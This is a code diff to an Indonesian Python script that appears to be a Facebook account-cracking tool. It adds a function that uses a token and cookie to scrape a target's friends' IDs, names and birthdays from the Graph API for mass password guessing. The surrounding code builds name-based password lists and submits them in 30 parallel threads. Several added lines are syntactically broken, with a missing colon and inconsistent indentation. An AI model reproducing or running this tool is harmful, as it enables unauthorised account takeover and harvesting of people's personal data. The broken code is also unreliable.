@@ -208,7 +208,7 @@ def author():
      print(nel(f'\t\t          [bold blue]Info Author', style=f"bold purple"))
      print(f"  {H2}╰─▶{B2} ✶ [bold yellow] Author:[bold green]Khoirul-Xd")
      print(f"  {H2}╰─▶{B2} ✶ [bold yellow] Status:[bold green]Premium bpk lo")
-     print(f"  {H2}╰─▶{B2} ✶ [bold yellow] GitHub:[bold green]https://github.com/khoirulez")
+     print(f"  {H2}╰─▶{B2} ✶ [bold yellow] GitHub:{B2}https://github.com/khoirulez")
 
 #--------------------[ TUMBAL ]--------------#
 def menu():
@@ -232,8 +232,8 @@ def menu():
 		banner()
 		print(nel(" "* spasi_awal + pesan_selamat, style=f"bold purple"))
 	print(nel(f"\t\t         [bold blue]Info Tumbal",style=f"bold purple"))
-	print(f"  {H2}╰─▶{B2} ✶[bold yellow] User Tumbal : {H2}{nama}")
-	print(f"  {H2}╰─▶{B2} ✶[bold yellow] ID Tumbal : {B2}{id}")
+	print(f"  {H2}╰─▶{B2} ✶ [bold yellow] User Tumbal :{H2}{nama}")
+	print(f"  {H2}╰─▶{B2} ✶ [bold yellow] ID Tumbal :{B2}{id}")
 #--------------------[ USER ]--------------#
 import requests
 from datetime import datetime
@@ -251,10 +251,10 @@ def info_user():
         zona_waktu = data.get('timezone')
 
         # Menggunakan rprint dari modul rich untuk formatting
-        rprint(nel(f'\t\t   [bold blue]Info User', style=f"bold purple"))
-        rprint(f"  {H2}╰─▶{B2} ✶ [bold yellow] Your IP:[bold green]{alamat_ip}")
+        rprint(nel(f'\t\t         [bold blue]Info User', style=f"bold purple"))
+        rprint(f"  {H2}╰─▶{B2} ✶ [bold yellow] Your IP:{B2}{alamat_ip}")
         rprint(f"  {H2}╰─▶{B2} ✶ [bold yellow] Region:[bold green]{region}")
-        rprint(f"  {H2}╰─▶{B2} ✶ [bold yellow] Lokasi:[bold green]{lokasi}")
+        rprint(f"  {H2}╰─▶{B2} ✶ [bold yellow] Lokasi:{B2}{lokasi}")
         rprint(f"  {H2}╰─▶{B2} ✶ [bold yellow] Kota:[bold green]{kota}")
         rprint(f"  {H2}╰─▶{B2} ✶ [bold yellow] Zona Waktu:[bold green]{zona_waktu}")
 
@@ -416,7 +416,9 @@ def login_menu():
         massal()
     elif ___Sllowly_ID____ in ['2']:
         print(nel(f'\t\t [bold blue]Publik Crack',width=90, padding=(0, 8), style=f"bold purple"))
-        dump3()
+        idt = input(f'\n✶ ━━⫸ {H2} Masukkan ID Target  : {m}')
+		dump4(idt,"",{"cookie":cok},token)
+		setting()
     elif ___Sllowly_ID____ in ['3']:
 	    mail2()
     elif ___Sllowly_ID____ in ['4']:
@@ -539,6 +541,40 @@ def dump3():
 	except (KeyError,IOError):
 		jalan(" gagal dump id... mungkin privat friends/gada friends nya") 
 		login_menu()
+#------------------[ CRACK-PUBLIK ]-----------------#
+def dump4(idt,fields,cookie,token):
+	try:
+		headers = {
+			"connection": "keep-alive", 
+			"accept": "*/*", 
+			"sec-fetch-dest": "empty", 
+			"sec-fetch-mode": "cors",
+			"sec-fetch-site": "same-origin", 
+			"sec-fetch-user": "?1",
+			"sec-ch-ua-mobile": "?1",
+			"upgrade-insecure-requests": "1", 
+			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
+			"accept-encoding": "gzip, deflate",
+			"accept-language": "id-ID,id;q=0.9"
+		}
+		if len(id) == 0:
+			params = {
+				"access_token": token,
+				"fields": f"name,friends.fields(id,name,birthday)"
+			}
+		else:
+			params = {
+				"access_token": token,
+				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
+			}
+		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
+		for i in url["friends"]["data"]:
+			#print(i["id"]+"|"+i["name"])
+			id.append(i["id"]+"|"+i["name"])
+			sys.stdout.write(f"\r'✶ ━━⫸ {H2}SUKSES MENGUMPULKAN{h} {len(id)}{P} ID{P}"),
+			sys.stdout.flush()
+		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
+	except:pass
 #-----------------[ CRACK EMAIL ]-----------------#
 def mail2():
 	dump=[]
@@ -824,7 +860,7 @@ def massal():
 		exit()
 ###----------[ ATUR SBLUM KREK ]----------###
 def setting():
-	cetak(nel(f"                        [bold blue]login ID Crack", title=f"{asu}{len(id)}{M2} ID TELAH DIKUMPULKAN", style=f"bold purple"))
+	cetak(nel(f"                        [bold blue]login ID Crack", width=90, padding=(0, 8), title=f"{asu}{len(id)}{M2} ID TELAH DIKUMPULKAN", style=f"bold purple"))
 	print(f"{H2}╰─▶ {B2}01 [bold purple]Facebook ID {M2}Old\n")
 	print(f"{H2}╰─▶ {B2}02 [bold purple]Facebook ID {K2}New\n")
 	print(f"{H2}╰─▶ {B2}03 [bold purple]Facebook ID {H2}Random\n")
@@ -901,8 +937,9 @@ def passwrd():
 	banner()
 	print(nel(f'                !{H} PROSES CRACK SEDANG BERLANGSUNG{N} !', style=f"bold purple"))
 	print(nel(f'               !{H} ON/OFF MODE PESAWAT SEBELUM MULAI{N} !', style=f"bold purple"))
-	with tred(max_workers=30) as pool:
-		for yuzong in id2:
+	with prog:
+		with tred(max_workers=30) as pool
+		  for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
 			pwv = []
@@ -939,7 +976,7 @@ def passwrd():
 				pool.submit(crack2,idf,pwv)
 			else:
 				pool.submit(crack,idf,pwv)
-	print('')
+	    print('')
 	cetak(nel('\t    [cyan][bold green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan][white] '))
 	print(f'[•]{H2} OK : {H2}%s '%(ok))
 	print(f'[•]{K2} CP : {K2}%s '%(cp))
